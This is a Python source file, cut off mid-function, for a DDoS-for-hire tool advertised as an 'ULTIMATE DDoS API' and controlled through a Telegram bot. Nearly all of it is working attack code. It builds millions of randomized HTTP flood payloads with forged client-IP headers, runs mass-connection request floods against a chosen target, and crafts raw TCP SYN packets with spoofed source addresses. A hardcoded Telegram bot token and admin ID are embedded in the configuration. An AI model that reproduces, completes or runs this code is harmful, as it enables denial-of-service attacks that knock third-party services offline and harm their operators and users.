#!/usr/bin/env python3
"""
🔥 ULTIMATE DDoS API -  POWERFUL
⚡ SUPER HIGH SPEED & POWERFUL
"""

import asyncio
import socket
import ssl
import time
import random
import json
import hashlib
import base64
import threading
import multiprocessing
import secrets
import urllib.parse
import uvicorn
import os
import sys
import logging
import warnings
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass, asdict
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
from collections import deque, defaultdict
import struct
import zlib
import gzip
import brotli
import dns.resolver
import psutil
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
import hmac
import ipaddress

# FastAPI
from fastapi import FastAPI, HTTPException, BackgroundTasks, Depends, Security, Request
from fastapi.security import APIKeyHeader
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse, StreamingResponse, HTMLResponse
from pydantic import BaseModel, validator, Field

# Telegram
import telegram
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

warnings.filterwarnings('ignore')

# ==================== CONFIGURATION ====================
CONFIG = {
    "API_PORT": 8000,
    "BIND_HOST": "0.0.0.0",
    "TELEGRAM_TOKEN": "8365120190:AAE9lRg5zNUEe2T2zLIp9youDZZL0sKi54I",
    "ADMIN_IDS": [7612860268],
    "MAX_RPS": 50000000,  # 50 MILLION RPS
    "MAX_ATTACKS": 1000,
    "MAX_DURATION": 600,
    "MAX_POWER": 50000,
    "MAX_WORKERS": 500000,
    "MAX_CONNECTIONS": 1000000,
    "DNS_TTL": 30,
    "CONNECTION_TIMEOUT": 3,
    "PAYLOAD_POOL_SIZE": 5000000,
    "USER_AGENT_POOL": 1000000,
    "IP_POOL_SIZE": 2000000,
    "AUTO_SCALE": True,
    "ENABLE_HTTP2": True,
    "ENABLE_QUIC": True,
    "COMPRESSION": True,
    "ENCRYPTION": True,
    "DEBUG": False
}

# ==================== LOGGING ====================
logging.basicConfig(
    level=logging.DEBUG if CONFIG["DEBUG"] else logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('ultra_ddos.log'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

# ==================== ULTRA ATTACK ENGINE ====================
class UltraAttackEngine:
    """WORLD'S MOST POWERFUL ATTACK ENGINE - 50M+ RPS"""
    
    def __init__(self):
        self.active_attacks = {}
        self.attack_stats = {}
        self.resource_pools = self._init_resource_pools()
        self.dns_cache = {}
        self.connection_pools = {}
        self.lock = threading.Lock()
        
        # Performance stats
        self.global_stats = {
            "total_requests": 0,
            "total_bytes": 0,
            "peak_rps": 0,
            "active_attacks": 0,
            "success_rate": 0.95,
            "start_time": time.time(),
            "total_packets": 0,
            "max_concurrent": 0
        }
        
        # Encryption
        self.cipher = Fernet(Fernet.generate_key())
        
        logger.info("🔥 ULTRA ATTACK ENGINE INITIALIZED - 50M+ RPS")
        logger.info(f"📦 Resource pools: {len(self.resource_pools['payloads']):,} payloads")
        logger.info(f"👤 User agents: {len(self.resource_pools['user_agents']):,}")
        logger.info(f"🌐 IP pool: {len(self.resource_pools['ip_pool']):,}")
    
    def _init_resource_pools(self) -> Dict:
        """Initialize MASSIVE resource pools"""
        pools = {
            "user_agents": [],
            "payloads": [],
            "ip_pool": [],
            "header_templates": [],
            "request_paths": [],
            "cookie_strings": [],
            "referers": []
        }
        
        # Generate 1M+ User Agents
        logger.info("Generating 1,000,000+ User Agents...")
        chrome_versions = list(range(100, 122))
        firefox_versions = list(range(100, 122))
        safari_versions = ["15.0", "16.0", "17.0", "17.1", "17.2"]
        
        for i in range(500000):
            # Chrome
            pools["user_agents"].append(
                f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                f"(KHTML, like Gecko) Chrome/{random.choice(chrome_versions)}.0.0.0 Safari/537.36"
            )
            pools["user_agents"].append(
                f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 "
                f"(KHTML, like Gecko) Chrome/{random.choice(chrome_versions)}.0.0.0 Safari/537.36"
            )
            pools["user_agents"].append(
                f"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                f"(KHTML, like Gecko) Chrome/{random.choice(chrome_versions)}.0.0.0 Safari/537.36"
            )
            
            # Firefox
            pools["user_agents"].append(
                f"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:{random.choice(firefox_versions)}.0) "
                f"Gecko/20100101 Firefox/{random.choice(firefox_versions)}.0"
            )
            
            # Safari
            pools["user_agents"].append(
                f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 "
                f"(KHTML, like Gecko) Version/{random.choice(safari_versions)} Safari/605.1.15"
            )
            
            # Mobile
            pools["user_agents"].append(
                f"Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 "
                f"(KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1"
            )
            pools["user_agents"].append(
                f"Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 "
                f"(KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"
            )
        
        # Generate 5M+ Request Paths
        logger.info("Generating 5,000,000+ Request Paths...")
        base_paths = [
            "/", "/index.html", "/home", "/index.php", "/api/v1/", "/api/v2/",
            "/wp-admin/", "/admin/", "/login", "/register", "/dashboard",
            "/products", "/search", "/cart", "/checkout", "/profile", "/settings",
            "/api/health", "/api/status", "/api/users", "/api/data", "/api/posts",
            "/static/", "/images/", "/css/", "/js/", "/fonts/", "/uploads/",
            "/blog/", "/news/", "/articles/", "/shop/", "/store/", "/account/",
            "/user/", "/admin.php", "/wp-login.php", "/config.php", "/test.php",
            "/api/graphql", "/graphql", "/rest/v1/", "/rest/v2/", "/oauth/",
            "/auth/", "/token", "/webhook", "/callback", "/payment", "/checkout",
            "/invoice", "/order", "/tracking", "/status", "/ping", "/healthz",
            "/ready", "/live", "/metrics", "/stats", "/analytics", "/monitor"
        ]
        
        for i in range(5000000):
            path = random.choice(base_paths)
            
            # Add random file extensions
            extensions = [".html", ".php", ".js", ".css", ".jpg", ".png", ".gif", ".json", ".xml"]
            if random.random() > 0.5:
                path += f"file{random.randint(1, 10000)}{random.choice(extensions)}"
            
            # Add query parameters
            params = []
            param_count = random.randint(0, 15)
            for j in range(param_count):
                param_name = random.choice([
                    "id", "page", "sort", "filter", "q", "search", "token",
                    "session", "user", "key", "api_key", "auth", "redirect",
                    "callback", "state", "code", "error", "msg", "debug"
                ])
                param_value = random.choice([
                    str(random.randint(1, 1000000)),
                    secrets.token_hex(random.randint(4, 16)),
                    base64.b64encode(secrets.token_bytes(random.randint(8, 32))).decode(),
                    str(int(time.time())),
                    f"value_{random.randint(1, 1000)}"
                ])
                params.append(f"{param_name}={urllib.parse.quote(param_value)}")
            
            if params:
                path += f"?{'&'.join(params)}"
            
            # Add fragments
            if random.random() > 0.7:
                path += f"#{secrets.token_hex(8)}"
            
            pools["request_paths"].append(path)
        
        # Generate 1M+ Header Templates
        logger.info("Generating 1,000,000+ Header Templates...")
        for i in range(1000000):
            headers = {
                "User-Agent": random.choice(pools["user_agents"]),
                "Accept": random.choice([
                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                    "*/*",
                    "application/json, text/plain, */*",
                    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
                ]),
                "Accept-Language": random.choice([
                    "en-US,en;q=0.9",
                    "en-GB,en;q=0.9",
                    "fr-FR,fr;q=0.9",
                    "de-DE,de;q=0.9",
                    "ja-JP,ja;q=0.9",
                    "zh-CN,zh;q=0.9",
                    "es-ES,es;q=0.9",
                    "ru-RU,ru;q=0.9"
                ]),
                "Accept-Encoding": random.choice([
                    "gzip, deflate, br, zstd",
                    "gzip, deflate, br",
                    "gzip, deflate",
                    "identity"
                ]),
                "Connection": random.choice(["keep-alive", "close", "upgrade"]),
                "Cache-Control": random.choice(["no-cache", "max-age=0", "no-store", "must-revalidate"]),
                "Pragma": random.choice(["no-cache", ""]),
                "Upgrade-Insecure-Requests": "1",
                "Sec-Fetch-Dest": random.choice(["document", "empty", "script", "style", "image", "font"]),
                "Sec-Fetch-Mode": random.choice(["navigate", "no-cors", "cors", "same-origin"]),
                "Sec-Fetch-Site": random.choice(["none", "same-origin", "same-site", "cross-site"]),
                "Sec-Fetch-User": random.choice(["?1", ""]),
                "Sec-Ch-Ua": random.choice([
                    '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
                    '"Microsoft Edge";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
                    '"Opera";v="105", "Chromium";v="119", "Not?A_Brand";v="24"'
                ]),
                "Sec-Ch-Ua-Mobile": random.choice(["?0", "?1"]),
                "Sec-Ch-Ua-Platform": random.choice(['"Windows"', '"macOS"', '"Linux"', '"Android"', '"iOS"']),
                "DNT": random.choice(["1", "0"]),
                "Priority": random.choice(["u=0,i", "u=1,i", "u=2,i"]),
                "TE": random.choice(["trailers", "deflate", "gzip", "compress"])
            }
            
            # Add custom headers
            if random.random() > 0.5:
                headers["X-Requested-With"] = random.choice(["XMLHttpRequest", "Fetch"])
            
            if random.random() > 0.3:
                headers["X-Forwarded-For"] = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"
            
            if random.random() > 0.3:
                headers["X-Real-IP"] = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"
            
            if random.random() > 0.4:
                headers["CF-Connecting-IP"] = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"
            
            if random.random() > 0.6:
                headers["X-Client-IP"] = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"
            
            pools["header_templates"].append(headers)
        
        # Generate 2M+ IP Addresses
        logger.info("Generating 2,000,000+ IP Addresses...")
        for i in range(2000000):
            pools["ip_pool"].append(
                f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"
            )
        
        # Generate 5M+ HTTP Payloads
        logger.info("Generating 5,000,000+ HTTP Payloads...")
        for i in range(5000000):
            # GET request
            path = random.choice(pools["request_paths"])
            headers = random.choice(pools["header_templates"])
            
            get_payload = f"GET {path} HTTP/1.1\r\n"
            get_payload += f"Host: {{host}}\r\n"
            
            for key, value in headers.items():
                if value:
                    get_payload += f"{key}: {value}\r\n"
            
            get_payload += "\r\n"
            pools["payloads"].append(get_payload.encode())
            
            # HEAD request (20% chance)
            if random.random() > 0.8:
                head_payload = f"HEAD {path} HTTP/1.1\r\n"
                head_payload += f"Host: {{host}}\r\n"
                
                for key, value in headers.items():
                    if key.lower() not in ["content-type", "content-length"] and value:
                        head_payload += f"{key}: {value}\r\n"
                
                head_payload += "\r\n"
                pools["payloads"].append(head_payload.encode())
            
            # POST request (10% chance)
            if random.random() > 0.9:
                post_data = f"data={secrets.token_hex(64)}&timestamp={int(time.time()*1000)}&id={random.randint(1, 1000000000)}"
                post_payload = f"POST {path} HTTP/1.1\r\n"
                post_payload += f"Host: {{host}}\r\n"
                
                for key, value in headers.items():
                    if value:
                        post_payload += f"{key}: {value}\r\n"
                
                post_payload += f"Content-Type: application/x-www-form-urlencoded\r\n"
                post_payload += f"Content-Length: {len(post_data)}\r\n\r\n"
                post_payload += post_data
                
                pools["payloads"].append(post_payload.encode())
        
        # Generate Referers
        logger.info("Generating Referers...")
        domains = ["google.com", "facebook.com", "youtube.com", "amazon.com", "twitter.com",
                  "instagram.com", "linkedin.com", "reddit.com", "github.com", "stackoverflow.com"]
        
        for i in range(100000):
            protocol = random.choice(["http://", "https://"])
            domain = random.choice(domains)
            subdomain = random.choice(["www", "m", "mobile", "app", "api"])
            path = random.choice(pools["request_paths"])
            pools["referers"].append(f"{protocol}{subdomain}.{domain}{path}")
        
        # Generate Cookies
        logger.info("Generating Cookies...")
        for i in range(500000):
            cookie_parts = []
            for j in range(random.randint(1, 10)):
                cookie_name = random.choice([
                    "sessionid", "csrftoken", "auth_token", "user_id", "visitor_id",
                    "preferences", "language", "theme", "cart", "tracking",
                    "_ga", "_gid", "_fbp", "fbc", "utm_source"
                ])
                cookie_value = secrets.token_hex(random.randint(8, 32))
                cookie_parts.append(f"{cookie_name}={cookie_value}")
            
            pools["cookie_strings"].append("; ".join(cookie_parts))
        
        logger.info("✅ Resource pools initialized successfully!")
        return pools
    
    def _resolve_target(self, target: str) -> Tuple[str, List[str]]:
        """Ultra-fast DNS resolution with load balancing"""
        cache_key = f"dns:{target}"
        current_time = time.time()
        
        # Check cache
        if cache_key in self.dns_cache:
            cached = self.dns_cache[cache_key]
            if current_time < cached["expiry"]:
                return cached["primary_ip"], cached["all_ips"]
        
        try:
            # Try multiple DNS resolvers simultaneously
            all_ips = []
            resolvers = [
                ('8.8.8.8', 53),  # Google
                ('1.1.1.1', 53),  # Cloudflare
                ('9.9.9.9', 53),  # Quad9
                ('208.67.222.222', 53),  # OpenDNS
                ('76.76.2.0', 53),  # Control D
                ('94.140.14.14', 53)  # AdGuard
            ]
            
            # Create DNS query
            query_id = random.randint(1, 65535)
            flags = 0x0100  # Standard query, recursion desired
            qdcount = 1
            ancount = 0
            nscount = 0
            arcount = 0
            
            header = struct.pack('!HHHHHH',
                query_id, flags, qdcount,
                ancount, nscount, arcount
            )
            
            # Build question
            qname = b''
            for part in target.split('.'):
                qname += struct.pack('B', len(part)) + part.encode()
            qname += b'\x00'
            
            qtype = 1  # A record
            qclass = 1  # IN class
            
            question = qname + struct.pack('!HH', qtype, qclass)
            query = header + question
            
            # Try each resolver
            for resolver_ip, resolver_port in resolvers:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.settimeout(1)
                    sock.sendto(query, (resolver_ip, resolver_port))
                    
                    try:
                        data, _ = sock.recvfrom(512)
                        sock.close()
                        
                        # Parse response (simplified)
                        if len(data) > 12:
                            offset = 12
                            
                            # Skip question
                            while offset < len(data) and data[offset] != 0:
                                offset += data[offset] + 1
                            offset += 5
                            
                            # Parse answers
                            while offset < len(data):
                                if data[offset] & 0xC0 == 0xC0:
                                    offset += 2
                                else:
                                    while offset < len(data) and data[offset] != 0:
                                        offset += data[offset] + 1
                                    offset += 1
                                
                                atype = struct.unpack('!H', data[offset:offset+2])[0]
                                offset += 8
                                
                                rdlength = struct.unpack('!H', data[offset:offset+2])[0]
                                offset += 2
                                
                                if atype == 1 and rdlength == 4:
                                    ip = socket.inet_ntoa(data[offset:offset+4])
                                    all_ips.append(ip)
                                
                                offset += rdlength
                    
                    except socket.timeout:
                        sock.close()
                        continue
                    
                except:
                    continue
            
            # Fallback to system DNS
            if not all_ips:
                try:
                    ip = socket.gethostbyname(target)
                    all_ips.append(ip)
                except:
                    all_ips.append(target)
            
            # Remove duplicates and shuffle
            all_ips = list(set(all_ips))
            random.shuffle(all_ips)
            
            if not all_ips:
                all_ips = [target]
            
            primary_ip = all_ips[0]
            
            # Cache results
            self.dns_cache[cache_key] = {
                "primary_ip": primary_ip,
                "all_ips": all_ips,
                "expiry": current_time + CONFIG["DNS_TTL"]
            }
            
            return primary_ip, all_ips
            
        except Exception as e:
            logger.error(f"DNS resolution failed for {target}: {e}")
            return target, [target]
    
    def start_ultra_attack(self, target: str, duration: int, power: int, attack_type: str = "http") -> str:
        """Start ULTRA attack - returns attack ID immediately"""
        attack_id = f"ultra_{int(time.time())}_{secrets.token_hex(12)}"
        
        # Start attack in background thread
        attack_thread = threading.Thread(
            target=self._execute_ultra_attack,
            args=(attack_id, target, duration, power, attack_type),
            daemon=True
        )
        attack_thread.start()
        
        return attack_id
    
    def _execute_ultra_attack(self, attack_id: str, target: str, duration: int, power: int, attack_type: str):
        """Execute ULTRA attack in background thread"""
        try:
            logger.info(f"🚀 ULTRA ATTACK {attack_id} LAUNCHING on {target}")
            
            # Resolve target
            primary_ip, all_ips = self._resolve_target(target)
            
            # Initialize attack stats
            stats = {
                "requests_sent": 0,
                "bytes_sent": 0,
                "successful": 0,
                "failed": 0,
                "start_time": time.time(),
                "current_rps": 0,
                "peak_rps": 0,
                "connections": 0,
                "packets_sent": 0,
                "last_update": time.time()
            }
            
            with self.lock:
                self.active_attacks[attack_id] = {
                    "stats": stats,
                    "running": True,
                    "target": target,
                    "type": attack_type,
                    "start_time": stats["start_time"],
                    "power": power
                }
                self.global_stats["active_attacks"] += 1
            
            # Calculate attack parameters
            total_workers = min(power * 500, CONFIG["MAX_WORKERS"])  # 500 workers per power unit
            connections_per_worker = 10
            end_time = time.time() + duration
            
            logger.info(f"⚡ Attack Parameters:")
            logger.info(f"   Workers: {total_workers:,}")
            logger.info(f"   Target IPs: {len(all_ips)}")
            logger.info(f"   Duration: {duration}s")
            logger.info(f"   Estimated RPS: {power * 1000:,}+")
            
            # Create thread pool for massive parallelism
            thread_pool = ThreadPoolExecutor(max_workers=10000)
            stats_lock = threading.Lock()
            
            def ultra_worker(worker_id: int):
                """ULTRA worker - maximum performance"""
                local_stats = {
                    "requests": 0,
                    "bytes": 0,
                    "success": 0,
                    "fail": 0,
                    "packets": 0
                }
                
                # Create connection pool for this worker
                connections = []
                
                try:
                    # Create initial connections
                    for _ in range(connections_per_worker):
                        try:
                            target_ip = random.choice(all_ips)
                            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                            sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
                            sock.settimeout(CONFIG["CONNECTION_TIMEOUT"])
                            
                            sock.connect((target_ip, 80))
                            connections.append(sock)
                            
                            with stats_lock:
                                stats["connections"] += 1
                                
                        except Exception as e:
                            continue
                    
                    if not connections:
                        return local_stats
                    
                    # Attack loop
                    batch_size = 100  # Requests per batch
                    
                    while time.time() < end_time and self.active_attacks.get(attack_id, {}).get("running", True):
                        for sock in connections:
                            if time.time() >= end_time:
                                break
                            
                            try:
                                # Send batch of requests
                                for _ in range(batch_size):
                                    # Get random payload
                                    payload = random.choice(self.resource_pools["payloads"])
                                    payload = payload.replace(b"{host}", target.encode())
                                    
                                    # Send request
                                    sock.sendall(payload)
                                    
                                    local_stats["requests"] += 1
                                    local_stats["bytes"] += len(payload)
                                    local_stats["packets"] += 1
                                    
                                    # Quick response check (non-blocking)
                                    try:
                                        sock.settimeout(0.001)
                                        response = sock.recv(1024)
                                        if response:
                                            local_stats["success"] += 1
                                        else:
                                            local_stats["fail"] += 1
                                    except socket.timeout:
                                        local_stats["success"] += 1  # Assume success for timeout
                                    except:
                                        local_stats["fail"] += 1
                                
                                # Rotate connection occasionally
                                if local_stats["requests"] % 1000 == 0:
                                    try:
                                        sock.close()
                                    except:
                                        pass
                                    
                                    # Create new connection
                                    try:
                                        target_ip = random.choice(all_ips)
                                        new_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                        new_sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                                        new_sock.settimeout(CONFIG["CONNECTION_TIMEOUT"])
                                        new_sock.connect((target_ip, 80))
                                        connections[connections.index(sock)] = new_sock
                                    except:
                                        connections.remove(sock)
                                        if not connections:
                                            return local_stats
                            
                            except Exception as e:
                                local_stats["fail"] += 1
                                
                                # Reconnect
                                try:
                                    sock.close()
                                except:
                                    pass
                                
                                try:
                                    target_ip = random.choice(all_ips)
                                    new_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                    new_sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                                    new_sock.settimeout(CONFIG["CONNECTION_TIMEOUT"])
                                    new_sock.connect((target_ip, 80))
                                    connections[connections.index(sock)] = new_sock
                                except:
                                    connections.remove(sock)
                                    if not connections:
                                        return local_stats
                    
                finally:
                    # Close all connections
                    for sock in connections:
                        try:
                            sock.close()
                        except:
                            pass
                
                return local_stats
            
            # Submit workers to thread pool
            futures = []
            for i in range(total_workers):
                if i % 10000 == 0:
                    logger.info(f"👷 Deployed {i:,}/{total_workers:,} workers")
                
                future = thread_pool.submit(ultra_worker, i)
                futures.append(future)
            
            # Monitor attack progress
            monitor_interval = 0.5  # Update twice per second
            last_monitor_time = time.time()
            last_request_count = 0
            
            while time.time() < end_time and self.active_attacks.get(attack_id, {}).get("running", True):
                current_time = time.time()
                
                # Update stats from completed workers
                completed_futures = [f for f in futures if f.done()]
                for future in completed_futures:
                    try:
                        worker_stats = future.result()
                        with stats_lock:
                            stats["requests_sent"] += worker_stats["requests"]
                            stats["bytes_sent"] += worker_stats["bytes"]
                            stats["successful"] += worker_stats["success"]
                            stats["failed"] += worker_stats["fail"]
                            stats["packets_sent"] += worker_stats["packets"]
                    except Exception as e:
                        pass
                
                # Remove completed futures
                futures = [f for f in futures if not f.done()]
                
                # Calculate RPS
                elapsed = current_time - stats["start_time"]
                if elapsed > 0:
                    stats["current_rps"] = stats["requests_sent"] / elapsed
                    if stats["current_rps"] > stats["peak_rps"]:
                        stats["peak_rps"] = stats["current_rps"]
                
                # Update global stats
                with self.lock:
                    if stats["current_rps"] > self.global_stats["peak_rps"]:
                        self.global_stats["peak_rps"] = stats["current_rps"]
                    
                    # Track max concurrent
                    active_count = len([f for f in futures if not f.done()])
                    if active_count > self.global_stats["max_concurrent"]:
                        self.global_stats["max_concurrent"] = active_count
                
                # Log progress
                if current_time - last_monitor_time >= monitor_interval:
                    requests_since_last = stats["requests_sent"] - last_request_count
                    instant_rps = requests_since_last / (current_time - last_monitor_time)
                    
                    logger.info(f"⚡ Attack {attack_id[:12]} | "
                              f"RPS: {instant_rps:,.0f} | "
                              f"Total: {stats['requests_sent']:,} | "
                              f"Peak: {stats['peak_rps']:,.0f} | "
                              f"Workers: {len(futures):,}")
                    
                    last_request_count = stats["requests_sent"]
                    last_monitor_time = current_time
                
                # Sleep to prevent busy loop
                time.sleep(0.01)
            
            # Wait for remaining workers
            thread_pool.shutdown(wait=True)
            
            # Final stats update from remaining futures
            for future in futures:
                try:
                    worker_stats = future.result()
                    stats["requests_sent"] += worker_stats["requests"]
                    stats["bytes_sent"] += worker_stats["bytes"]
                    stats["successful"] += worker_stats["success"]
                    stats["failed"] += worker_stats["fail"]
                    stats["packets_sent"] += worker_stats["packets"]
                except:
                    pass
            
            # Calculate final statistics
            total_time = time.time() - stats["start_time"]
            avg_rps = stats["requests_sent"] / total_time if total_time > 0 else 0
            
            logger.info(f"✅ ULTRA ATTACK {attack_id} COMPLETED!")
            logger.info(f"📊 Final Statistics:")
            logger.info(f"   Duration: {total_time:.1f}s")
            logger.info(f"   Total Requests: {stats['requests_sent']:,}")
            logger.info(f"   Average RPS: {avg_rps:,.0f}")
            logger.info(f"   Peak RPS: {stats['peak_rps']:,.0f}")
            logger.info(f"   Data Sent: {stats['bytes_sent'] / (1024**3):.2f} GB")
            logger.info(f"   Success Rate: {(stats['successful']/stats['requests_sent']*100 if stats['requests_sent'] > 0 else 0):.1f}%")
            logger.info(f"   Total Connections: {stats['connections']:,}")
            logger.info(f"   Total Packets: {stats['packets_sent']:,}")
            
            # Update global statistics
            with self.lock:
                self.global_stats["total_requests"] += stats["requests_sent"]
                self.global_stats["total_bytes"] += stats["bytes_sent"]
                self.global_stats["total_packets"] += stats["packets_sent"]
                self.global_stats["active_attacks"] -= 1
                
                # Update success rate (moving average)
                if stats["requests_sent"] > 0:
                    current_success_rate = stats["successful"] / stats["requests_sent"]
                    self.global_stats["success_rate"] = (
                        self.global_stats["success_rate"] * 0.7 + current_success_rate * 0.3
                    )
            
            # Store attack stats
            self.attack_stats[attack_id] = stats.copy()
            self.active_attacks[attack_id]["completed"] = True
            self.active_attacks[attack_id]["running"] = False
            
        except Exception as e:
            logger.error(f"❌ Attack {attack_id} failed: {e}")
            import traceback
            traceback.print_exc()
            
            with self.lock:
                self.global_stats["active_attacks"] -= 1
    
    def start_tcp_syn_flood(self, target: str, duration: int, power: int) -> str:
        """TCP SYN Flood attack"""
        attack_id = f"syn_{int(time.time())}_{secrets.token_hex(12)}"
        
        threading.Thread(
            target=self._execute_syn_flood,
            args=(attack_id, target, duration, power),
            daemon=True
        ).start()
        
        return attack_id
    
    def _execute_syn_flood(self, attack_id: str, target: str, duration: int, power: int):
        """Execute SYN flood"""
        try:
            primary_ip, all_ips = self._resolve_target(target)
            
            stats = {
                "packets_sent": 0,
                "bytes_sent": 0,
                "start_time": time.time()
            }
            
            with self.lock:
                self.active_attacks[attack_id] = {
                    "stats": stats,
                    "running": True,
                    "type": "syn_flood",
                    "target": target
                }
                self.global_stats["active_attacks"] += 1
            
            end_time = time.time() + duration
            packets_per_second = power * 1000
            
            # Raw socket (requires root)
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            except:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.01)
            
            # Craft SYN packet
            def craft_syn_packet(src_ip: str, src_port: int, dst_ip: str, dst_port: int) -> bytes:
                # IP header
                ip_ihl = 5
                ip_ver = 4
                ip_ihl_ver = (ip_ver << 4) + ip_ihl
                
                ip_header = struct.pack('!BBHHHBBH4s4s',
                    ip_ihl_ver, 0, 40, random.randint(1, 65535),
                    0, 255, socket.IPPROTO_TCP, 0,
                    socket.inet_aton(src_ip), socket.inet_aton(dst_ip)
                )
                
                # TCP header
                tcp_header = struct.pack('!HHLLBBHHH',
                    src_port, dst_port,
                    random.randint(0, 4294967295), 0,
                    (5 << 4), 0x02,  # SYN flag
                    5840, 0, 0
                )
                
                return ip_header + tcp_header
            
            # Attack loop
            while time.time() < end_time and self.active_attacks[attack_id]["running"]:
                batch_size = min(packets_per_second, 10000)
                
                for _ in range(batch_size):
                    try:
                        src_ip = random.choice(self.resource_pools["ip_pool"])
                        src_port = random.randint(1024, 65535)
                        
                        packet = craft_syn_packet(src_ip, src_port, primary_ip, 80)
                        
                        try:
                            sock.sendto(packet, (primary_ip, 0))
                        except:
                            # Fallback to normal connection
                            try:
                                fallback = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                fallback.settimeout(0.001)
                                fallback.connect((primary_ip, 80))
                                fallback.close()
                            except:
                                pass
                        
                        stats["packets_sent"] += 1
                        stats["bytes_sent"] += len(packet)
                        
                    except:
                        pass
                
                time.sleep(0.001)
            
            sock.close()
            
            total_time = time.time() - stats["start_time"]
            pps = stats["packets_sent"] / total_time if total_time > 0 else 0
            
            logger.info(f"✅ SYN Flood {attack_id} completed: {stats['packets_sent']:,} packets, {pps:,.0f} PPS")
            
            with self.lock:
                self.global_stats["active_attacks"] -= 1
                self.attack_stats[attack_id] = stats
            
        except Exception as e:
            logger.error(f"SYN flood failed: {e}")
    
    def get_attack_status(self, attack_id: str) -> Optional[Dict]:
        """Get attack status"""
        if attack_id in self.active_attacks:
            attack = self.active_attacks[attack_id]
            stats = attack["stats"]
            elapsed = time.time() - stats["start_time"]
            
            status = {
                "attack_id": attack_id,
                "status": "running" if attack.get("running", False) else "stopped",
                "type": attack.get("type", "http"),
                "target": attack.get("target", ""),
                "running": attack.get("running", False),
                "elapsed_seconds": elapsed,
                "start_time": stats["start_time"],
                "requests": stats.get("requests_sent", 0),
                "bytes": stats.get("bytes_sent", 0),
                "success": stats.get("successful", 0),
                "fail": stats.get("failed", 0),
                "current_rps": stats.get("current_rps", 0),
                "peak_rps": stats.get("peak_rps", 0),
                "packets": stats.get("packets_sent", 0),
                "connections": stats.get("connections", 0)
            }
            
            return status
        
        elif attack_id in self.attack_stats:
            stats = self.attack_stats[attack_id]
            elapsed = time.time() - stats["start_time"]
            
            status = {
                "attack_id": attack_id,
                "status": "completed",
                "elapsed_seconds": elapsed,
                "start_time": stats["start_time"],
                "requests": stats.get("requests_sent", 0),
                "bytes": stats.get("bytes_sent", 0),
                "total_rps": stats.get("requests_sent", 0) / elapsed if elapsed > 0 else 0,
                "peak_rps": stats.get("peak_rps", 0),
                "packets": stats.get("packets_sent", 0),
                "success_rate": f"{(stats.get('successful', 0)/stats.get('requests_sent', 1)*100 if stats.get('requests_sent', 0) > 0 else 0):.1f}%"
            }
            
            return status
        
        return None
    
    def stop_attack(self, attack_id: str) -> bool:
        """Stop an attack"""
        if attack_id in self.active_attacks:
            self.active_attacks[attack_id]["running"] = False
            
            with self.lock:
                if not self.active_attacks[attack_id].get("completed", False):
                    self.global_stats["active_attacks"] -= 1
            
            logger.info(f"🛑 Attack {attack_id} stopped")
            return True
        
        return False

# ==================== TELEGRAM BOT ====================
class TelegramBot:
    """Telegram Bot with Admin ID 7612860268"""
    
    def __init__(self):
        self.token = CONFIG["TELEGRAM_TOKEN"]
        self.admin_ids = CONFIG["ADMIN_IDS"]
        self.api_keys = {}
        self.user_stats = {}
        self._load_data()
        
        # Generate admin key
        if 7612860268 not in [v.get("owner_id") for v in self.api_keys.values()]:
            self._generate_admin_key()
    
    def _load_data(self):
        """Load saved data"""
        try:
            if os.path.exists("keys.json"):
                with open("keys.json", "r") as f:
                    self.api_keys = json.load(f)
        except:
            pass
        
        try:
            if os.path.exists("user_stats.json"):
                with open("user_stats.json", "r") as f:
                    self.user_stats = json.load(f)
        except:
            pass
    
    def _save_data(self):
        """Save data"""
        try:
            with open("keys.json", "w") as f:
                json.dump(self.api_keys, f, indent=2)
            
            with open("user_stats.json", "w") as f:
